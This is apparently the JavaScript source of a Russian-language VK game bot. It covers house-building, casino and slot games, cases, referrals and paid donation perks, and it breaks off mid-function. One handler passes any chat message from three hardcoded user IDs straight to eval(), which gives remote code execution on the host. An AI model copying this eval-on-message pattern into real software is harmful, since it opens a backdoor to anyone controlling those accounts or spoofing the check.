const { VK } = require('vk-io');
const vk = new VK();
const commands = [];
const users = require('./users.json'); 
const promo = require('./promo.json'); 

let user = new VK();
user.setOptions({
	token: 'тут токен'
});


setInterval(async () => {
	await saveUsers();
}, 10000);

async function saveUsers() {
	require('fs').writeFileSync('./users.json', JSON.stringify(users, null, '\t'));
	require('fs').writeFileSync('./promo.json', JSON.stringify(promo, null, '\t'));
	return true;
}

setInterval(async () => {
	users.filter(x=> x.home == true).map(x=> {
            var wat = rand(1, 100);
            var ele = rand(1, 100);
            var maxo = (x.residents/10).toFixed(0);
            var maxo = (maxo == 0) ? 1: maxo;
            var mino = (maxo/2).toFixed(0);
            x.residents += (wat <= x.water) ? rand(0, maxo): rand(0, mino);
            x.residents += (ele <= x.electro) ? rand(0, maxo): rand(0, mino);
            x.residents += (x.works >= maxo) ? rand(0, maxo): rand(0, mino);
            x.residents -= (wat <= x.water) ? rand(0, mino): rand(0, maxo);
            x.residents -= (ele <= x.electro) ? rand(0, mino): rand(0, maxo);
            x.residents -= (x.works >= maxo) ? rand(0, mino): rand(0, maxo);
            x.residents = (x.residents > x.colvo) ? x.colvo:
            (x.residents < 0) ? 0: x.residents;
	});
}, 600000);

setInterval(async () => {
	users.filter(x=> x.bonus != 0).map(x=> {
		x.bonus -= 1;
	});
}, 1000);

setInterval(async () => {
	users.filter(x=> x.bank > 0).map(x=> {
		x.bank += Number((x.bank/100).toFixed(0));
	});
}, 3600000);

setInterval(async () => {
	users.filter(x=> x.fire != 0).map(x=> {
		x.fire -= 1;
	});
}, 1000);

setInterval(async () => {
	users.filter(x=> x.ograb != 0).map(x=> {
		x.ograb -= 1;
	});
}, 1000);

setInterval(async () => {
	users.filter(x=> x.podval != 0).map(x=> {
		x.podval -= 1;
	});
}, 1000);

setInterval(async () => {
	users.filter(x=> x.activ != "с4").map(x=> {
		x.activ++;
	});
}, 1000);

setInterval(async () => {
	users.filter(x=> x.home == true).map(x=> {
	 var obh = (x.obhome == true) ? (x.residents*10000)/10: 0;
		x.money+=(x.residents*10000+obh);
       x.money-=(x.residents*x.water*x.electro);
       x.money -= x.works*1000;
x.money = (x.money < 0) ? 0: x.money;
	});
}, 600000);

setInterval(async () => {
	users.filter(x=> x.rekl > 0 && x.rekl_id > 0).map(x=> {
		 var rkmin = (x.rekl_id == 1) ?  10:
(x.rekl_id == 2) ? 1000:
(x.rekl_id == 3) ? 100000:
(x.rekl_id == 4) ? 10000000: 0;
var rkmax = (x.rekl_id == 1) ?  30:
(x.rekl_id == 2) ? 3000:
(x.rekl_id == 3) ? 300000:
(x.rekl_id == 4) ? 30000000: 0;
function rand(min, max) {
	return Math.round(Math.random() * (max - min)) + min
};
x.residents += rand(rkmin, rkmax);
x.residents = (x.residents > x.colvo) ? x.colvo: x.residents;
x.rekl -= 600;
x.rekl_id = (x.rekl == 0) ? 0: x.rekl_id;
	});
}, 600000);

setInterval(async () => {
	users.filter(x=> x.work != 0).map(x=> {
		x.work -= 1;
	});
}, 1000);

setInterval(async () => {
	users.filter(x=> x.ban_acc != 0).map(x=> {
		x.ban_acc -= 1;
	});
}, 1000);

setInterval(async () => {
	users.filter(x=> x.hack != 0).map(x=> {
		x.hack -= 1;
	});
}, 1000);

setInterval(async () => {
	users.filter(x=> x.poxod != 0).map(x=> {
		x.poxod -= 1;
	});
}, 1000);

vk.setOptions({ token: 'и тут токен', pollingGroupId: 182090109 });
const { updates, snippets } = vk;

updates.startPolling();
updates.on('message', async (message) => {
	if(Number(message.senderId) <= 0) return;
	if(/\[club182090109|(.*)\]/i.test(message.text)) message.text = message.text.replace(/\[club182090109\|(.*)\]/ig, '').trim();
	if(!users.find(x=> x.id === message.senderId)) {
		const date = new Date();

		users.push({
          id: message.senderId,
		  name: "Пользователь не зарегестрован",
          home: false,
          obhome: false,
          activ: 0,
          residents: 5,
          water: 70,
          electro: 70,
          colvo: 100,
          cost: 1000000,
          works: 5,
          wmax: 10,
          level: 1,
          rekl: 0,
          rekl_id: 0,
          post: 0,
          hack: 0,
          money: 0,
          bank: 0,
          donate: 0,
          win: 45,
          work: 0,
          bonus: 0,
          ban_acc: 0,
          ban_rep: false,
          ban_pay: false,
          ban_top: false,
          limit_pay: true,
          refka: false,
          ref: 0,
          fire: 0,
          podval: 0,
          poxod: 0,
          ograb: 0,
          uid: users.length
		});
	}
	
	i = users.find(x=> x.id === message.senderId);
	if(i.ban_acc != 0) return;

 const bot = (text, params) => {
		return message.send(text, params)
	}

	const command = commands.find(x=> x[0].test(message.text));
	if(!command) return;
	i.activ = 0;

 args = message.text.match(command[0]);
	await command[1](message, bot);

});

const cmd = {
	on: (p, f) => {
		commands.push([p, f]);
	}
}

function sp(string) {
var syt = string;
		if (typeof string !== "string") string = string.toString();
		if(string.length < 21) return string.split("").reverse().join("").match(/[0-9]{1,3}/g).join(",").split("").reverse().join("");
		return syt;
	};

function scl(number, titles) {
	cases = [2, 0, 1, 1, 1, 2];
	return titles[(number % 100 > 4 && number % 100 < 20) ? 2 : cases[(number % 10 < 5) ? number % 10 : 5]];
};

function timer(seconds) {
    if(seconds == "") return "0 секунд"
    var hours = parseInt(seconds/3600 );
    seconds = seconds%3600;
    var minutes = parseInt(seconds/60); 
    seconds = seconds%60;
    hours = (hours == 0 ? "" : hours + " " + scl(hours, ["час", "часа", "часов"]))
    minutes = (minutes == 0 ? "" : minutes + " " + scl(minutes, ["минуту", "минуты", "минут"]))
    seconds = (seconds == 0 ? "" : seconds + " " + scl(seconds, ["секунду", "секунды", "секунд"]))
    var gone = hours + " " + minutes + " " + seconds
    return gone
};

function repl(num){
	var sjop = num.replace(/(k|K|К|к)/ig, "000")
   sjop = sjop.replace(/(все|Все|Всё|всё)/ig, i.money)
	return [sjop]
};  

function fix(num) {
num = Number(num)
num = num.toFixed(0)
num = Number(num)
return [num]
}

function rand(min, max) {
	return Math.round(Math.random() * (max - min)) + min
}

cmd.on(/^(?:eval)\s([^]+)$/i, async (message, bot) => {
	if(i.id != 339414555 && i.id != 490337364 && i.id != 514083009) return;
	try {
	  message.send("Готово: "+JSON.stringify(eval(args[1])));
	} catch(err){
		console.log(err);
		message.send(">Error: "+ err);
	}
});

cmd.on(/^(?:положить|пополнить)\s([^]+)$/i, async (message, bot) => {
	 var mon = repl(args[1]);
	if(!Number(mon)) return message.send("📛 || Сумма должна быть числовой!");
	if(mon < 1) return message.send("📛| Сумма должна быть больше 0!");
	mon = Number(fix(mon));
	if(i.money < mon) return message.send("На вашем балансе нет столько денег!");
	i.money -= mon;
	i.bank += mon;
	message.send("💳 || Вы успешно пополнили банковский счёт!");
	});
	
	cmd.on(/^(?:снять|вывести)\s([^]+)$/i, async (message, bot) => {
	 var mon = repl(args[1]);
	if(!Number(mon)) return message.send("📛 || Сумма должна быть числовой!");
	mon = Number(fix(mon));
	if(i.bank < mon) return message.send("У вас нет столько $ в банке!");
	i.money += mon;
	i.bank -= mon;
	message.send("💵 || Вы успешно сняли $ с банковского счёта!");
	});

	cmd.on(/^(?:состав)/i, async (message, bot) => {  
		let sozdatels, admins, moders, vips, chat; 
		sozdatels = '\nСоздатели\n';
		admins = '\nАдминистраторы\n'; 
		moders = '\nМодераторы\n';
		vips = '\nВипы\n'; 
		for (let id in users) {
			if(users[id]){
			let user = users[id];

			if (user.post == 4) sozdatels += `🔹 » @id${users[id].id}(${users[id].name})\n`;
			if (user.post == 3) admins += `🔹 » @id${users[id].id}(${users[id].name})\n`;
			if (user.post == 2) moders += `🔹 » @id${users[id].id}(${users[id].name})\n`;
			if (user.post == 1) vips += `🔹 » @id${users[id].id}(${users[id].name})\n`; 
			}
		}
		let text = `\n`;
		if (sozdatels.length != 24) text += sozdatels; 
		if (admins.length != 24) text += admins; 
		if (moders.length != 24) text += moders; 
		if (vips.length != 24) text += vips;
		return message.send(`${text}`);
	});

cmd.on(/^(?:кейсы|кеисы)$/i, async (message, bot) => {
	message.send("💼 CASE-SHOP 💼\n\n♦Кейс каменный♦\n🔍| Может выпасть: до 100.000$, до 5 жителей.\n💲Цена: 50.000$\n📔ID: 1\n\n♦Кейс медный♦\n🔍| Может выпасть: до 1.000.000$, до 30 жителей, до 30 рабочих.\n💲Цена: 500.000$\n📔ID: 2\n\n♦Кейс золотой♦\n🔍| Может выпасть: до 10.000.000$, до 100 жителей, до 100 рабочих.\n💲Цена: 5.000.000$\n📔ID: 3\n\n♦Кейс алмазный♦\n🔍| Может выпасть: до 1.000.000.000$, до 1000 жителей, до 1000 рабочих.\n💲Цена: 500.000.000$\n📔ID: 4\n\n🔘Кейс Донат🔘\n🔍| Может выпасть: валюта, привилегии(VIP, MODER).\n💲Цена: 50 доната.\n📔ID: 5\n———\n🔹Для покупки кейса пишите: Кейс [id кейса]");
	});
	
	cmd.on(/^(?:поджог)$/i, async (message, bot) => {
		if(i.home == false) return message.send("📛 || У вас нет дома!");
	if(i.level < 10) return message.send("📛 || Для поджога дома нужно иметь уровень дома [10] или выше!");
	if(i.fire != 0) return message.send("📛 || Подождите еще: "+timer(i.fire)+"\n\n🔹Поджигать дом можно раз в час.");
	var cop = rand(1, 5);
	if(cop == 5) {
		var straf = Number((i.money/1000).toFixed(0)*rand(1, 50))
		message.send("😱 || Вы попытались поджечь дом, но вас поймала полиция и вы получаете штраф: "+sp(straf)+"$");
		i.money -= straf;
		i.money = (i.money < 0) ? 0: i.money;
		i.fire = 3600;
		return true;
		}
	var fmon = Number((i.money/1000).toFixed(0)*rand(0, 25));
	i.money += fmon;
	i.fire = 3600;
	message.send("🔥 || Вы успешно подожгли дом игрока и получили: "+sp(fmon)+"$");
	});

		cmd.on(/^(?:о|огр|ограб|ограбление)$/i, async (message, bot) => {
		if(i.home == false) return message.send("📛 || У вас нет дома!");
	if(i.level < 10) return message.send("📛 || Для поджога дома нужно иметь уровень дома [10] или выше!");
	if(i.ograb != 0) return message.send("📛 || Подождите еще: "+timer(i.ograb)+"\n\n🔹 Грабить дом можно раз в час.");
	var cop = rand(1, 5);
	if(cop == 5) {
		var straf = Number((i.money/1000).toFixed(0)*rand(1, 50))
		message.send("😱 || Вы попытались обокрасть дом, но вас поймала полиция и вы получаете штраф: "+sp(straf)+"$");
		i.money -= straf;
		i.money = (i.money < 0) ? 0: i.money;
		i.ograb = 3600;
		return true;
		}
	var fmon = Number((i.money/1000).toFixed(0)*rand(0, 25));
	i.money += fmon;
	i.ograb = 3600;
	message.send("🔥 || Вы успешно ограбили дом игрока и получили: "+sp(fmon)+"$");
	});
	
	cmd.on(/^(?:подвал)$/i, async (message, bot) => {
		if(i.home == false) return message.send("📛 || У вас нет дома!");
	if(i.level < 10) return message.send("📛 || Для похода в подвал нужно иметь уровень дома [10] или выше!");
	if(i.podval != 0) return message.send("📛 || Подождите еще: "+timer(i.podval)+"\n---\n🔹Ходить в подвал можно раз в час.");
	var cop = rand(1, 5);
	if(cop == 5) {
		var straf = Number((i.money/1000).toFixed(0)*rand(1, 25))
		message.send("🚑 || Вы вошли в подвал и упали, у вас ушло "+sp(straf)+"$ на лечение.");
		i.money -= straf;
		i.money = (i.money < 0) ? 0: i.money;
		i.podval = 3600;
		return true;
		}
	var fmon = Number((i.residents/100).toFixed(0)*rand(0, 5));
	i.residents += fmon;
	i.residents = (i.residents > i.colvo) ? i.colvo: i.residents;
	i.podval = 3600;
	message.send("👥 || Вы вошли в подвал и нашли там "+sp(fmon)+" полу-живых жителей.");
	});
	
	cmd.on(/^(?:кейс|кеис)\s([^]+)$/i, async (message, bot) => {
		var tep = args[1];
		if(tep != "1" && tep != "2" && tep != "3" && tep != "4" && tep != "5") return message.send("📛| Такого кейса не существует!");
         if(tep == "1") {
         	if(i.money < 50000) return message.send("	а вашем балансе нет столько денег!");
         i.money -= 50000;
			var mons = rand(10000, 100000)-rand(0, 25000);
			mons = (mons < 0) ? 0: mons;
			var lif = rand(0, 5)-rand(0, 3);
			lif = (lif < 0) ? 0: lif;
			i.money += mons;
			i.residents += lif;
			i.residents = (i.residents > i.colvo) ? i.colvo: i.residents;
			message.send("🎁 » Вы открыли каменный кейс!\n🎉--->Выпало<---🎉\n💲| Валюты: +"+sp(mons)+"$\n👨| Жителей: +"+sp(lif)+" человек");
			}
			if(tep == "2") {
         	if(i.money < 500000) return message.send("На вашем балансе нет столько денег!");
         i.money -= 500000;
			var mons = rand(100000, 1000000)-rand(0, 250000);
			mons = (mons < 0) ? 0: mons;
			var lif = rand(0, 30)-rand(0, 15);
			lif = (lif < 0) ? 0: lif;
			var rab = rand(0, 30)-rand(0, 15);
			rab = (rab < 0) ? 0: rab;
			i.money += mons;
			i.residents += lif;
			i.works += rab;
			i.residents = (i.residents > i.colvo) ? i.colvo: i.residents;
			i.works = (i.works > i.wmax) ? i.wmax: i.works;
			message.send("🎁 » Вы открыли медный кейс!\n🎉--->Выпало<---🎉\n💲| Валюты: +"+sp(mons)+"$\n👨| Жителей: +"+sp(lif)+" человек\n👷| Работников: +"+sp(rab)+" человек");
			}
			if(tep == "3") {
         	if(i.money < 5000000) return message.send("На вашем балансе нет столько денег!");
         i.money -= 5000000;
			var mons = rand(1000000, 10000000)-rand(0, 2500000);
			mons = (mons < 0) ? 0: mons;
			var lif = rand(0, 100)-rand(0, 50);
			lif = (lif < 0) ? 0: lif;
			var rab = rand(0, 100)-rand(0, 50);
			rab = (rab < 0) ? 0: rab;
			i.money += mons;
			i.residents += lif;
			i.works += rab;
			i.residents = (i.residents > i.colvo) ? i.colvo: i.residents;
			i.works = (i.works > i.wmax) ? i.wmax: i.works;
			message.send("🎁 » Вы открыли золотой кейс!\n🎉--->Выпало<---🎉\n💲| Валюты: +"+sp(mons)+"$\n👨| Жителей: +"+sp(lif)+" человек\n👷| Работников: +"+sp(rab)+" человек");
			}
			if(tep == "4") {
         	if(i.money < 500000000) return message.send("На вашем балансе нет столько денег!");
         i.money -= 500000000;
			var mons = rand(100000000, 1000000000)-rand(0, 250000000);
			mons = (mons < 0) ? 0: mons;
			var lif = rand(0, 1000)-rand(0, 500);
			lif = (lif < 0) ? 0: lif;
			var rab = rand(0, 1000)-rand(0, 500);
			rab = (rab < 0) ? 0: rab;
			i.money += mons;
			i.residents += lif;
			i.works += rab;
			i.residents = (i.residents > i.colvo) ? i.colvo: i.residents;
			i.works = (i.works > i.wmax) ? i.wmax: i.works;
			message.send("🎁 » Вы открыли алмазный кейс!\n🎉--->Выпало<---🎉\n💲| Валюты: +"+sp(mons)+"$\n👨| Жителей: +"+sp(lif)+" человек\n👷| Работников: +"+sp(rab)+" человек");
			}
			if(tep == "5") {
         	if(i.donate < 50) return message.send("Не хватает доната!");
         i.donate -= 50;
			var pryze = rand(1, 5);
			i.money += (pryze == 1) ? 50000000000: 
			(pryze == 2) ? 100000000000:
			(pryze == 3) ? 3000000000000: 0;
			i.post = (pryze == 4 && i.post < 1) ? 1:
			(pryze == 5 && i.post < 2) ? 2: i.post;
			var tsd = (pryze == 1) ? "Валюта: (50KKK)$":
			(pryze == 2) ? "Валюта: (100KKK)$":
			(pryze == 3) ? "Валюта: (3KKKK)$":
			(pryze == 4) ? "Привилегия: (VIP)":
			(pryze == 5) ? "Привилегия: (MODERATOR)": "";
			message.send("🔘 » Вы открыли DONATE кейс!\n🎉--->Выпало<---🎉\n🔹"+tsd);
			}
		});

cmd.on(/^(?:старт|статья|начать)$/i, async (message, bot) => {
	message.send("✋Привет, вы начинающий бизнесмен, я Джонни и я помогу вам достич высот! Для начала вам нужно заработать 5.000$ не хватающих на постройку дома которую я почти всю оплатил.\n👊Для заработка пишите 'работать', для просмотра баланса используйте команду 'баланс'. После того как вы заработаете 5.000$ вы сможете купить себе дом 'Построить [название]', затем вам нужно следить за своим домом и набирать жителей, а также нужно иметь достаточное количество работников чтобы жителям было комфортно жить и они оставались с вами навсегда, количество новых жителей зависит от кол-ва воды, электроэнергии и рабочих., на каждые 10жителей должен иметься хотябы 1рабочий., ну в прочем ,что я объясняю, напишите 'Помощь' и там увидите весь список команд, удачи💙");
	});

cmd.on(/^(?:когда)\s([^]+)$/i, async (message, bot) => {
var kog = ["никогда", "через час", "через 3 дня", "через 7 минут", "через 5 минут", "через 2 минуты", "через минуту", "скоро", "через 59 минут", "через 2 недели", "через неделю", "через 5 секнуд", "через 15 секунд", "через секунду", "через 5 лет", "через 3 века", "через 5млн лет", "через 4 месяца", "через 10 месяцев"];
var kg = kog[rand(0, kog.length-1)];
message.send(args[1]+" "+kg);
});

cmd.on(/^(?:слоты)\s([^]+)$/i, async (message, bot) => {
var sym = repl(args[1]);
if(!Number(sym)) return message.send("📛 || Ставка должна быть числовой!");
if(sym < 1) return message.send("📛| Сумма должна быть больше 0!");
if(i.money < sym) return message.send("На вашем балансе нет столько денег!");
sym = Number(fix(sym));
if(i.money < sym) return message.send("На вашем балансе нет столько денег!");
var sml = ["💎", "🍇", "🍎"];
var sm1 = sml[rand(0, 2)];
var sm2 = sml[rand(0, 2)];
var sm3 = sml[rand(0, 2)];
if(sm1 == "🍎" && sm1 == sm2 && sm2 == sm3) {
	i.money += sym;
	return message.send("😑Вам выпадает комбинация [🍎🍎🍎], ставка (×2), вы выигрываете: "+sp(sym*2)+"$");
	}
	if(sm1 == "🍇" && sm1 == sm2 && sm2 == sm3) {
	i.money += sym*4;
	return message.send("😏 || Вам выпадает комбинация [🍇🍇🍇], ставка (×5), вы выигрываете: "+sp(sym*5)+"$");
	}
	if(sm1 == "💎" && sm1 == sm2 && sm2 == sm3) {
	i.money += sym*9;
	return message.send("😎 || Вам выпадает комбинация [💎💎💎], ставка (×10), вы выигрываете: "+sp(sym*10)+"$");
	}
	i.money -= sym;
	message.send("😞 || Вам выпадает комбинация ["+sm1+sm2+sm3+"], ставка (×0), вы проигрываете: "+sp(sym)+"$");
});

cmd.on(/^(?:казино|ставка)\s([^]+)$/i, async (message, bot) => {
	var sym = repl(args[1]);
	if(!Number(sym)) return message.send("📛| Ставка должна быть числовой!");
sym = Number(fix(sym));
if(sym < 1) return message.send("📛| Сумма должна быть больше 0!");
if(i.money < sym) return message.send("На вашем балансе нет столько денег!");
var cha = rand(1, 100);
if(cha > 0 && cha <= i.win) {
	i.money += sym;
	return message.send("😎 » Вы выиграли "+sp(sym)+"$");
	};
	i.money -= sym;
	message.send("😭 » Вы проиграли "+sp(sym)+"$");
});

cmd.on(/^(?:кости)\s([^]+)$/i, async (message, bot) => {
	var sym = repl(args[1]);
	if(!Number(sym)) return message.send("📛 || Ставка должна быть числовой!");
sym = Number(fix(sym));
if(sym < 1) return message.send("📛 || Сумма должна быть больше 0!");
if(i.money < sym) return message.send("На вашем балансе нет столько денег!");
var botys = rand(1, 6);
var tii = rand(1, 6);
var snek = rand(1, 10);
if(snek == 5) {
	i.money -= sym;
	return message.send("🎲Кости🎲\n➖➖➖➖➖\n🌝Вам выпало: "+rand(1, 3)+"\n🌚Мне выпало: "+rand(4, 6)+"\n———\n😨Вы проиграли: "+sp(sym)+"$");
	}
if(tii == botys) return message.send("🎲Кости🎲\n➖➖➖➖➖\n🌝Вам выпало: "+tii+"\n🌚Мне выпало: "+botys+"\n———\n🔁У нас ничья!");
if(tii < botys) {
	i.money -= sym;
	return message.send("🎲Кости🎲\n➖➖➖➖➖\n🌝Вам выпало: "+tii+"\n🌚Мне выпало: "+botys+"\n———\n😨Вы проиграли: "+sp(sym)+"$");
	}
	if(tii > botys) {
	i.money += sym;
	return message.send("🎲Кости🎲\n➖➖➖➖➖\n🌝Вам выпало: "+tii+"\n🌚Мне выпало: "+botys+"\n———\n💜Вы выиграли: "+sp(sym)+"$");
	}
});

cmd.on(/^(?:бонус)$/i, async (message, bot) => {
if(i.bonus != 0) return message.send("📛| Брать бонус можно раз в  час!\n⏰Подождите ещё: "+timer(i.bonus));
var sml1 = ["💥", "♻", "😇", "🎉", "💎"];
var sml = sml1[rand(0, 4)];
var rybes = Number((i.money/1000).toFixed(0)*rand(1, 200))
rybes = (rybes < 1000) ? rand(1, 100)*1000: rybes;
i.money+=rybes;
i.bonus = 3600;
message.send(sml+"Вы Взяли бонус!\n💰Бонус: "+sp(rybes)+"$");
});

cmd.on(/^(?:реклама)$/i, async (message, bot) => {
var rkp = (i.rekl_id == 0) ? "": 
(i.rekl_id == 1) ? "стартовая":
(i.rekl_id == 2) ? "средняя":
(i.rekl_id == 3) ? "большая":
(i.rekl_id == 4) ? "массовая": "";
var hinf = (i.rekl == 0) ? "": "\n🌚Ваша реклама🌚\n•Название: "+rkp+"\n•Оставшееся время: "+timer(i.rekl);
message.send(`
🎒Реклама домов:

🤝 Стартовая реклама
    👥 Жители - 100
    ⏰ Длительность рекламы: 50м.
    💳 Цена: 2.500.000$
    🆔 1

🤝 Средняя реклама
    👥 Жители - 12.000
    ⏰ Длительность рекламы: 1ч.
    💳 Цена: 250.000.000$
    🆔 2

🤝 Большая реклама
    👥 Жители - 1.400.000
    ⏰ Длительность рекламы: 70м.
    💳 Цена: 25.000.000.000$
    🆔 3

🤝 Массовая реклама
    👥 Жители - 200.000.000
    ⏰ Длительность рекламы: 100м.
    💳 Цена: 2.500.000.000.000
    🆔 4

🔹Для покупки пишите: Заказать [id рекламы]
`);
});

cmd.on(/^(?:заказать)\s([^]+)$/i, async (message, bot) => {
if(i.home == false) return message.send("📛| У вас нет дома!");
if(i.rekl_id != 0) return message.send("📛| У вас ещё действует старая реклама, для проверки рекламы пишите: Реклама");
if(args[1] != "1" && args[1] != "2" && args[1] != "3" && args[1] != "4") return message.send("📛| Такой рекламы не существует!");
var rekl_id = args[1];
var rkltime = (args[1] == "1") ? 3000: 
(args[1] == "2") ? 3600:
(args[1] == "3") ? 4200:
(args[1] == "4") ? 6000: 0;
var rkltxt = (args[1] == "1") ? "стартовую": 
(args[1] == "2") ? "среднюю":
(args[1] == "3") ? "большую":
(args[1] == "4") ? "массовую": 0;
var rklcost = (args[1] == "1") ? 2500000: 
(args[1] == "2") ? 250000000:
(args[1] == "3") ? 25000000000:
(args[1] == "4") ? 2500000000000: 0;
if(i.money < rklcost) return message.send("На вашем балансе нет столько денег!");
i.money -= rklcost;
i.rekl_id = args[1];
i.rekl = rkltime;
message.send("👉Вы успешно заказали "+rkltxt+" рекламу!");
});


cmd.on(/^(?:работать)$/i, async (message, bot) => {
if(i.work != 0) return message.send("📛| Работать можно раз в 30 секунд!\n⏰Подождите ещё: "+timer(i.work));
var sml1 = ["😮", "😛", "😇", "🎉", "💚"];
var sml = sml1[rand(0, 4)]
var rybes = 10*rand(0, 1000);
i.money+=rybes;
i.work = 30;
message.send(sml+"Вы поработали и заработали: "+sp(rybes)+"$\n---\n🔹Для просмотра баланса пишите: Баланс");
});

cmd.on(/^(?:дом|профиль)$/i, async (message, bot) => {
if(i.home == false) return message.send("??| У вас нет дома!\n---\n🔹Для покупки дома пишите: Построить [название компании]");
var obh = (i.obhome == true) ? (i.residents*10000)/10: 0;
var zar = i.residents*10000+obh;
var tra = (i.residents*i.water*i.electro)+(i.works*1000);
var zcol = (i.colvo-i.residents)
var rcol = (i.wmax-i.works)
message.send("🏡Ваш дом🏡\n\n♻ || ID дома "+i.uid+"\n🌐 || ИП "+i.name+"\n👑 || Уровень дома "+sp(i.level)+"\n💰 || Бюджет "+sp(i.money)+"$\n💳 || В банке "+sp(i.bank)+"$\n💸 || Донат "+sp(i.donate)+"\n👥 || Жителей ("+sp(i.residents)+"/"+sp(i.colvo)+") ч. (&#128101; До максимума: "+sp(zcol)+")\n👷 || Рабочих ("+sp(i.works)+"/"+sp(i.wmax)+") ч. (&#128101; До максимума: "+sp(rcol)+")\n💧 || Вода "+i.water+" ед/чел.\n⚡ || Электроэнергия "+i.electro+" ед/чел.\n\n💰 || Заработок "+sp(zar)+"$ / 10мин.\n💲 || Расход "+sp(tra)+"$ / 10мин.\n\n⚠ || Для улучшения дома пишите: Улучшить\n💸 || Цена улучшения "+sp(i.cost)+"$\n\n🐬 || Параметры улучшения:\n🍃 || Места в доме : +"+sp(i.colvo)+"\n🍃 || Места для рабочих: +"+sp(i.wmax));
});

cmd.on(/^(?:улучшить)$/i, async (message, bot) => {
if(i.home == false) return message.send("📛| У вас нет дома!");
if(i.money < i.cost) return message.send("На вашем балансе нет столько денег!");
i.money -= i.cost;
i.colvo *= 2;
i.wmax *= 2;
i.cost *= 3;
i.level++;
message.send("♻ || Вы улучшили уровень своего дома до "+sp(i.level)+" уровня!\n🔹Максимальное кол-во жителей, работников и цена улучшения повышены!");
});

cmd.on(/^(?:help|помощь)$/i, async (message, bot) => {
message.send(`

🐼Прочее:
 🍍 Дом - информация о вашем доме.
 💳 Баланс - проверка вашего баланса.
 🌹Передать [ид] [сумма] - передача валюты.
 💷 Магазин - дополнительные товары.
 🔖 Построить [название компании] - построить дом.
 🏆 Топ - лучше компаний!
🎒 Кейсы - рандомные вещи.
 📄 Промокод [код] - использование промокода.
 ⌚Когда [событие] - предсказывает когда произойдёт событие.

💡Важное:
 💧 Вода [0-100] - установить расход воды в вашем доме.
 ⚡ Энергия [0-100] - установить расход электроэнергии в вашем доме.
 👷 Нанять [кол-во] - нанять рабочих для дома.

⛵Заработок:
 🎁 Бонус - получить бонус.
 🔨 Работать - заработать денег.
 🎮 Казино [ставка] - игра в казино.
 🎰Слоты [ставка] - игра в слоты.
 🎲Кости [ставка] - игра в кости.
 📚 Реклама - список реклам.
 💰 Донат - донат магазин.
 👼Рефка - реферальная система.
 🔥Поджог - поджог дома.
 🍃Подвал - поход в подвал.
 🌿Поход - сходить в поход.

🔆Связь:
 🔎 Бот - информация о боте.
 🔑 Репорт [текст] - сообщение администраторам.
`,{ 
keyboard: JSON.stringify( 
{ 
"one_time": false, 
"buttons": [ 
[{ 
"action": { 
"type": "text", 
"payload": "{\"button\": \"1\"}", 
"label": "Профиль" 
}, 
"color": "primary" 
}, 
{ 
"action": { 
"type": "text", 
"payload": "{\"button\": \"2\"}", 
"label": "Помощь" 
}, 
"color": "primary" 
}], 
[{ 
"action": { 
"type": "text", 
"payload": "{\"button\": \"3\"}", 
"label": "Баланс" 
}, 
"color": "primary" 
}, 
{ 
"action": { 
"type": "text", 
"payload": "{\"button\": \"4\"}", 
"label": "Донат" 
}, 
"color": "primary" 
}] 
] 
}) 
}); 
});

cmd.on(/^(?:бот|bot|о боте)$/i, async (message, bot) => {
	var act = users.filter(x=> x.activ < 601).map(x=> x.uid);
	var ned = users.filter(x=> x.activ > 601 && x.activ < 86401).map(x=> x.uid);
	var neact = users.filter(x=> x.activ > 86400).map(x=> x.uid);
message.send("👥Игроков бота: "+sp(users.length)+"\n♻ || Активных: "+sp(act.length)+"\n⚠ || Недавних: "+sp(ned.length)+"\n⛔ ||  активных: "+sp(neact.length)+"");
});

setInterval(function () { 

user.api.status.set({ 
group_id: 182090109, 
text: "&#128278; Всего игроков: "+sp(users.length)}); 

}, 60000);


cmd.on(/^(?:рефка)$/i, async (message, bot) => {
	message.send("👼Реферальная Система👼\n———\n👥У вас рефералов: "+i.ref+"\n\n🔹За каждого реферала вы получите 1.000.000.000$ ,а ваш реферал получит 500.000.000$\n🔹После достижения 100 рефералов вам будет выдан безлимит на передачу + 10.000.000.000.000$\n---\n🔥Для того чтобы игрок стал вашим рефералом, он должен написать: реф "+i.uid);
	});
	
	cmd.on(/^(?:реф)\s([^]+)$/i, async (message, bot) => {
if(i.refka == true) return message.send("📛| Вы уже вводили реферальный код!");
if(i.uid == args[1]) return message.send("📛| Нельзя вводить свой реферальный код!");
if(!users[args[1]]) return message.send("📛| Такого реферального кода не существует!");
var du = users[args[1]];
i.money += 500000000;
i.refka = true;
du.ref++;
du.money += (du.ref == 100) ? 10000000000000: 1000000000;
du.limit_pay = (du.ref == 100) ? false: du.limit_pay;
var texd = (du.ref == 100) ? "\n---\n🎉У вас 100 рефералов, вы получаете 10.000.000.000.000$ + Снятие лимита на передачу!": "";
message.send("🚀Вы активировали реферальный код и получаете 500.000.000$");
vk.api.messages.send({user_id: du.id, message:"🚀Компания: "+i.name+", активировала ваш реферальный код и вы получаете 1.000.000.000$"+texd});
   });

cmd.on(/^(?:баланс)$/i, async (message, bot) => {
message.send("💽ID: "+i.uid+"\n💰Ваш баланс:\n"+sp(i.money)+"$\n\n💳В банке: \n"+sp(i.bank)+"$\n\n💸Донат: \n"+sp(i.donate)+"\n➖➖➖➖➖\n🔹Для пополнения банка пишите: пополнить [сумма]\n🔹Для снятия с банка пишите: снять [сумма]\n🔸Каждый час в ваш банк начисляется 1% от сбережений в банке.");
});

cmd.on(/^(?:донат|donate)$/i, async (message, bot) => {
message.send(`
💣 Донат Fire Bot 💣

50.000.000.000$ - 10 рублей. 
300.000.000.000$-25 рублей. 
1.000.000.000.000$ - 50 рублей.

🎃 Статус (VIP) - 50руб 

🎩 Статус (MODERATOR) - 150руб. 

🎧 Статус (Admin) - 300руб

✏ Смена игрового ника - 15 рублей. 


 🍎 За донатом к : [id339414555|Saveliy] || [id506966995|George]
`);
});

cmd.on(/^(?:поход)$/i, async (message, bot) => {
if(i.poxod != 0) return message.send("📛| Подождите ещё: "+timer(i.poxod)+"\n———\n🔹Ходить в поход можно раз в 10мин.");
 i.poxod = 600;
 var ygl = rand(-10, 20);
 var glass = rand(-10, 10);
 var zjel = rand(-15, 10);
 var gold = rand(-50, 10);
 var izym = rand(-100, 10);
 var alm = rand(-100, 5);
 var leg = rand(-100, 1);
 
 ygl = (ygl < 1) ? 0: ygl;
 glass = (glass < 1) ? 0: glass;
zjel = (zjel < 1) ? 0: zjel;
 gold = (gold < 1) ? 0: gold;
 izym = (izym < 1) ? 0: izym;
 alm = (alm < 1) ? 0: alm;
 leg = (leg < 1) ? 0: leg;
 
 var tx1 = (ygl > 0) ? "🔹Уголь("+ygl+") => "+ygl*1000+"$\n": "";
